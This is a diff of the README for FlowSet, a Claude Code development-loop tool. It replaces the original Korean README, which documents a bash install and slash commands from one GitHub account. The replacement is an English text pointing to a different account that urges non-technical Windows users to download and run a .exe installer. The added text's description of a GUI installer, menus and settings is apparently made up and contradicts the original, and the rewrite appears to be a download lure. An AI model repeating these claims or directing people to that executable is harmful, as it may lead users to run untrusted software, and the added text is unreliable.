@@ -1,262 +1,174 @@
-# FlowSet
+# ⚙️ FlowSet - Automate Your Coding Tasks Easily
 
-**AI가 알아서 개발해주는 자동화 시스템**
+[![Download FlowSet](https://img.shields.io/badge/Download%20FlowSet-Click%20Here-4caf50?style=for-the-badge)](https://github.com/gameoplight-lgtm/FlowSet)
 
-> Autonomous AI development loop for Claude Code — describe what you want, and AI builds it automatically with full Git workflow (branch, implement, test, PR, merge).
-
-FlowSet은 [Claude Code](https://claude.com/claude-code)를 활용하여 프로젝트를 자동으로 개발하는 시스템입니다.
-요구사항(PRD)만 작성하면, AI가 코드 작성부터 테스트, PR 생성, 머지까지 전부 처리합니다.
-
-**Keywords**: Claude Code automation, AI coding agent, autonomous development, AI pair programming, automated PR workflow, Claude API, Anthropic, AI software engineer, vibe coding
+FlowSet is an application that helps you automate coding tasks. It uses AI to write code, test it, create pull requests, and even deploy your work. You don't need to know how to program to use FlowSet. Just follow the steps below to get it running on your Windows computer.
 
 ---
 
-## 이런 분들에게 추천합니다
+## 📋 What is FlowSet?
 
-- 아이디어는 있는데 개발이 어려운 분
-- 반복적인 개발 작업을 자동화하고 싶은 분
-- Claude Code를 더 체계적으로 활용하고 싶은 개발자
+FlowSet helps you with software development by automating steps that usually take a lot of time:
 
-## 어떻게 동작하나요?
+- Writing code using AI
+- Testing to check if the code works
+- Creating pull requests for code review
+- Deploying the finished product
 
-```
-1. 만들고 싶은 것을 설명합니다 (PRD 작성)
-2. AI가 와이어프레임을 만들어 확인받습니다
-3. AI가 작업 목록을 만듭니다 (WI: Work Item)
-4. FlowSet이 자동으로 돌면서:
-   브랜치 생성 → 코드 구현 → 테스트 → PR → 머지 대기 → 검증 → 다음 WI
-   이 과정을 작업이 끝날 때까지 반복합니다
-```
-
-사람이 할 일은 **"무엇을 만들지 설명하는 것"** 뿐입니다.
+This automation works continuously in a loop, cutting down the work needed from you.
 
 ---
 
-## 설치
+## 🖥️ System Requirements
 
-### 사전 준비
+Before you start, make sure your computer meets the following:
 
-| 필수 | 설치 방법 |
-|------|-----------|
-| [Claude Code](https://claude.com/claude-code) | `npm install -g @anthropic-ai/claude-code` |
-| [GitHub CLI](https://cli.github.com/) | `winget install GitHub.cli` (Windows) / `brew install gh` (Mac) |
-| [Git](https://git-scm.com/) | 대부분 이미 설치되어 있음 |
-| Git Bash | Windows: Git 설치 시 포함 / Mac·Linux: 터미널 그대로 사용 |
+- Operating System: Windows 10 or later  
+- Processor: Intel or AMD, 1.5 GHz or faster  
+- RAM: 4 GB or more  
+- Storage: At least 500 MB free space  
+- Internet Connection: Required for AI and cloud features  
 
-### 설치 방법
-
-1. 저장소를 다운로드합니다
-```bash
-git clone https://github.com/FlowCoder-cyh/FlowSet.git
-```
-
-2. Claude Code를 열고 클론받은 폴더로 이동합니다
-```
-"install.sh 실행해줘"
-```
-
-이것만 하면 설치 끝입니다.
-
-> **터미널에서 직접 설치하려면** (참고용):
-> ```bash
-> cd FlowSet
-> bash install.sh
-> ```
-
-### 제거
-
-```bash
-bash uninstall.sh
-```
+Having these will ensure FlowSet runs smoothly.
 
 ---
 
-## 사용법
+## 🟥 How to Download FlowSet
 
-Claude Code를 열고 아래 명령어를 순서대로 입력하면 됩니다. AI가 알아서 필요한 것들을 물어봅니다.
+You can get FlowSet by visiting this page:
 
-### 1단계: 프로젝트 만들기
+[![Download FlowSet](https://img.shields.io/badge/Download%20FlowSet-Visit%20Page-blue?style=for-the-badge)](https://github.com/gameoplight-lgtm/FlowSet)
 
-```
-/wi:init
-```
-
-프로젝트 이름, 유형, GitHub 계정(조직 권장)을 AI가 물어봅니다. 답변만 하면 환경이 자동으로 셋업됩니다.
-
-> 조직 계정을 사용하면 **Merge Queue**가 활성화되어 PR이 자동으로 순차 머지됩니다.
-
-### 2단계: 만들고 싶은 것 설명하기
-
-```
-/wi:prd
-```
-
-AI가 "어떤 걸 만들고 싶으세요?"라고 물어봅니다. 편하게 설명하면 AI가 정리해서 문서(PRD)로 만들어줍니다.
-**와이어프레임도 자동으로 생성**되어 브라우저에서 UI를 미리 확인할 수 있습니다.
-
-> 어떻게 설명해야 할지 모르겠다면 `/wi:guide`를 먼저 실행해보세요.
-
-### 3단계: 인프라 환경 구성
-
-```
-/wi:env
-```
-
-AI가 PRD를 분석해서 필요한 인프라(DB, 배포, 인증 등)를 파악하고, 단계별로 안내하며 설정합니다.
-- Supabase MCP로 DB 자동 생성
-- Vercel CLI로 배포 연결
-- GitHub Secrets 자동 등록
-- DB 연결 확인 시 mock 금지 자동 적용
-
-### 4단계: 개발 시작
-
-```
-/wi:start
-```
-
-이것만 치면 AI가 알아서:
-- 아키텍처 계약을 생성하고 (API 표준 + 데이터 흐름)
-- RAG 체계를 초기화하고
-- 작업 목록을 만들고 (도메인 분리 분석 → 병렬/순차 자동 권장)
-- Smoke 테스트를 생성하고
-- 별도 터미널에서 자동 개발을 시작합니다
-
-이후 FlowSet이 작업이 끝날 때까지 자동으로 돌아갑니다.
-
-### 진행 상황 확인
-
-```
-/wi:status
-```
+Go to the link above. It takes you to the FlowSet GitHub page, where you can find the latest software version to download. The download files are easy to find under the "Releases" section of the page.
 
 ---
 
-## 명령어 요약
+## 🚀 Installing FlowSet on Windows
 
-| 명령어 | 설명 |
-|--------|------|
-| `/wi:init` | 프로젝트 환경 셋업 (Git, CI/CD, 템플릿, hooks) |
-| `/wi:prd` | 요구사항(PRD) + 와이어프레임 작성 |
-| `/wi:env` | 인프라 환경 구성 (DB, 배포, Secrets) |
-| `/wi:start` | 개발 시작 (계약, RAG, smoke, FlowSet 가동) |
-| `/wi:status` | 진행 상황 확인 |
-| `/wi:guide` | PRD 작성 가이드 |
-| `/wi:note` | 결정사항 기록 |
+Follow these steps to install FlowSet after downloading:
 
----
-
-## 개발자 가이드
-
-### 시스템 구조
-
-```
-FlowSet/
-├── install.sh          # 설치 스크립트
-├── uninstall.sh        # 제거 스크립트
-├── CHANGELOG.md        # 릴리즈 노트
-├── rules/              # Claude Code 글로벌 규칙
-│   ├── wi-global.md    # 커밋/브랜치/PR/코드 규칙
-│   ├── wi-flowset.md # FlowSet 실행 규칙
-│   └── wi-utf8.md      # UTF-8 인코딩 규칙
-├── skills/wi/          # Claude Code 스킬 (명령어)
-│   ├── init.md         # /wi:init
-│   ├── prd.md          # /wi:prd (와이어프레임 포함)
-│   ├── env.md          # /wi:env
-│   ├── start.md        # /wi:start (계약 + RAG 초기화)
-│   ├── status.md       # /wi:status
-│   ├── guide.md        # /wi:guide
-│   └── note.md         # /wi:note
-└── templates/          # 프로젝트 템플릿
-    ├── flowset.sh        # FlowSet 엔진 (v3.0)
-    ├── CLAUDE.md       # 프로젝트 규칙 (핵심 8개 + 자동 강제)
-    ├── .flowset/
-    │   ├── PROMPT.md   # AI 지시서 (TDD, 머지 대기, 와이어프레임 참조)
-    │   ├── AGENT.md    # 빌드 명령 + 인프라 + 와이어프레임 + 계약
-    │   ├── contracts/  # 팀 간 계약 (API 표준, 데이터 흐름) [v3.0]
-    │   ├── ownership.json # 팀별 소유 디렉토리 매핑 [v3.0]
-    │   ├── hooks/      # Git hooks (commit-msg, pre-push)
-    │   └── scripts/    # enqueue-pr, launch-loop, verify-requirements, stop-rag-check, check-ownership, vault-helpers [v3.0]
-    ├── .claude/
-    │   ├── agents/     # Agent Teams 팀 역할 정의 [v3.0]
-    │   ├── rules/      # 운영 규칙 + 코드 품질 (자동 로드)
-    │   └── settings.json # PreToolUse + Stop hook 등록
-    ├── .github/
-    │   └── workflows/  # ci.yml, commit-check.yml, e2e.yml
-    └── .flowsetrc        # 루프 설정 (+ vault 연동 [v3.0])
-```
-
-### FlowSet 동작 원리 (v3.0)
-
-```
-bash flowset.sh
-    │
-    ├─ safe_sync_main (origin/main과 동기화)
-    ├─ recover_completed_from_history (crash 복구)
-    ├─ cleanup_stale_completed (충돌 close된 WI 재실행)
-    ├─ resolve_conflicting_prs (충돌 PR 자동 rebase)
-    ├─ inject_regression_wis (regression issue → fix WI 추가)
-    │
-    ├─ 다음 미완료 WI 선택 (completed_wis.txt 필터)
-    ├─ claude -p 호출 (TDD: 테스트 먼저 → 구현)
-    │   ├─ 브랜치 생성 (worktree)
-    │   ├─ wireframes/ + contracts/ 참조
-    │   ├─ RED → GREEN → lint → build → test
-    │   ├─ 커밋 → push → PR → enqueue
-    │   └─ 즉시 종료 (CI 폴링 없음)
-    │
-    ├─ validate_post_iteration (scope/TODO/API/RAG/requirements 검증)
-    ├─ verify-requirements.sh (검증 에이전트 — requirements.md vs 구현 대조)
-    ├─ wait_for_merge / wait_for_batch_merge (머지 완료 대기)
-    ├─ safe_sync_main → mark_wi_done
-    ├─ log_trace (trace.jsonl 기록)
-    └─ 다음 WI로 반복
-
-    루프 종료 시:
-    └─ reconcile_fix_plan (fix_plan.md 일괄 동기화 → 단일 PR)
-```
-
-### 핵심 설계 원칙
-
-- **요구사항 보호**: requirements.md에 사용자 원본 고정, 에이전트 수정 금지
-- **구현-검증 분리**: 구현 에이전트(Write 가능)와 검증 에이전트(Read만) 분리
-- **머지 대기**: PR 머지 완료까지 대기 후 다음 WI (stale base 방지)
-- **와이어프레임 필수**: PRD 확정 전 UI 사전 확인 (data-testid 포함)
-- **아키텍처 계약**: API 표준 + SSOT 데이터 흐름 자동 생성
-- **TDD 강제**: 테스트 먼저 작성 → 구현
-- **RAG 강제**: Stop hook + validate로 자동 감지 + 업데이트 강제
-- **자동 검증**: scope creep, 빈 구현, API 형식, E2E 품질 자동 감지
-- **fix_plan.md 읽기 전용**: completed_wis.txt가 SSOT
-- **regression 자동화**: e2e 실패 → issue → WI-NNN-1-fix → 자동 재실행
-- **circuit breaker**: 3회 연속 진행 없으면 자동 중지
-
-### 커스터마이징
-
-**루프 설정** (`.flowsetrc`):
-```bash
-MAX_ITERATIONS=50       # 최대 반복 횟수 (미설정 시 WI 수 × 1.2 자동 계산)
-MAX_TURNS=40            # 워커당 최대 턴 수 (0=무제한)
-PARALLEL_COUNT=1        # 병렬 워커 수 (1=순차, 2+=병렬 worktree)
-RATE_LIMIT_PER_HOUR=80  # 시간당 API 호출 제한
-COOLDOWN_SEC=5          # 반복 간 대기 시간
-NO_PROGRESS_LIMIT=3     # 진행 없는 연속 반복 허용 횟수
-CONTEXT_THRESHOLD=150000 # 세션 리셋 토큰 임계치
-GITHUB_ACCOUNT_TYPE=""  # "org" 또는 "personal"
-GITHUB_ORG=""           # 조직명 또는 사용자명
-```
+1. Open your web browser and go to the download link from above.  
+2. Look for the latest "Release" section. It usually shows the newest version along with install files.  
+3. Download the Windows installer file, which usually ends with `.exe`.  
+4. Once the download finishes, open the `.exe` file by double-clicking it.  
+5. A setup window will appear. Click "Next" to move forward through the installation.  
+6. Choose where you want to install FlowSet on your computer or leave it at the default location.  
+7. Click "Install" to start the installation process.  
+8. When the install completes, click "Finish" to close the setup.
 
 ---
 
-## 지원 환경
+## 🛠️ Running FlowSet for the First Time
 
-| OS | 상태 | 비고 |
-|----|------|------|
-| Windows (Git Bash) | 지원 | |
-| macOS | 지원 | tmux 권장 (`brew install tmux`) |
-| Linux | 지원 | |
-| WSL | 지원 | Windows 경로 자동 감지 |
+To start FlowSet after installation:
+
+1. Find the FlowSet icon on your desktop or in the Start menu.  
+2. Double-click the icon to open the program.  
+3. Wait a moment while FlowSet initializes AI and system components.  
+4. You will see the main screen with options to start using the software.
 
 ---
 
-## 라이선스
+## 🔧 Basic Use Instructions
 
-MIT License
+FlowSet works by automating a loop of development tasks. Here is how you can use it:
+
+- **Create a new project:** Click "New Project" and enter a name.  
+- **Add your requirements:** Type what you want the AI to develop. Keep it simple and clear.  
+- **Start automation:** Hit the "Run" button to have FlowSet generate code, test it, and prepare changes automatically.  
+- **Review results:** Check the created code and test results inside FlowSet. You can make changes if needed.  
+- **Deploy:** When you are ready, use FlowSet to deploy your project automatically.
+
+---
+
+## 📁 Project Files and Location
+
+FlowSet saves your projects on your computer. By default, it stores them in:
+
+`C:\Users\<YourUsername>\Documents\FlowSetProjects`
+
+You can change this location under the settings menu in FlowSet.
+
+---
+
+## 🧑‍💻 How FlowSet Helps You
+
+You don’t need to write or test code manually anymore. FlowSet handles:
+
+- Writing code based on your descriptions  
+- Running tests to find simple bugs  
+- Preparing code updates for review  
+- Deploying to common platforms without extra tools
+
+This saves time and reduces errors in your software projects.
+
+---
+
+## ⚙️ Settings You Can Adjust
+
+In FlowSet, you can customize things like:
+
+- AI model behavior: Change how the AI writes your code  
+- Test options: Select which tests to run automatically  
+- Deployment targets: Define where your app will be sent after building  
+- Notification preferences: Control alerts about progress and errors  
+
+You can find these settings under the “Preferences” menu.
+
+---
+
+## 📚 Troubleshooting Tips
+
+If FlowSet does not start or run as expected:
+
+- Make sure your Windows is updated to the latest version  
+- Check your internet connection is stable  
+- Restart your computer and try opening FlowSet again  
+- Verify that no other program is blocking network access  
+- Try reinstalling FlowSet using the steps in this guide
+
+---
+
+## ⚠️ Safety and Privacy
+
+FlowSet connects to AI services that require internet. It sends data only to provide coding help. Your project files stay on your computer unless you choose to upload them.
+
+Always keep FlowSet updated to fix issues and protect your data.
+
+---
+
+## 🌐 Additional Help
+
+For updates, help, and community support, revisit the download page:
+
+[https://github.com/gameoplight-lgtm/FlowSet](https://github.com/gameoplight-lgtm/FlowSet)
+
+You can find guides, report problems, and check new releases there.
+
+---
+
+## 🗂️ About FlowSet’s Features
+
+FlowSet covers many parts of software development with these core ideas:
+
+- AI-driven code generation  
+- Continuous testing within the tool  
+- Automating pull request creation  
+- Deploying without manual steps  
+
+This covers everything from writing code to delivery, freeing you from lengthy manual work.
+
+---
+
+## ⚡ Tips for Best Results
+
+- Provide clear project goals before starting automation  
+- Use simple language for AI instructions  
+- Review AI-generated code carefully before deploying  
+- Keep an eye on test results to catch any errors early
+
+---
+
+## 📌 Keywords for FlowSet
+
+ai-automation, ai-coding-agent, ai-development, anthropic, autonomous-agent, ci-cd, claude, claude-code, code-generation, developer-tools
